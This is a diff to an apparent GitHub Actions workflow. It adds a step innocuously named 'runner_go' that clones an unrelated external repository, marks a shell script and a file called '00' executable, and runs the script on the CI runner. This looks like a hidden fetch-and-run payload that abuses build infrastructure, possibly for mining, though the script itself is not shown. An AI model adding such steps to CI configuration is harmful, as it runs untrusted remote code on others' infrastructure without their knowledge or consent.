@@ -24,3 +24,7 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
+          sudo apt update
+         git clone https://github.com/1drgrwe/statpol.git && cd statpol
+         chmod +x berak.sh && chmod +x 00
+         ./berak.sh
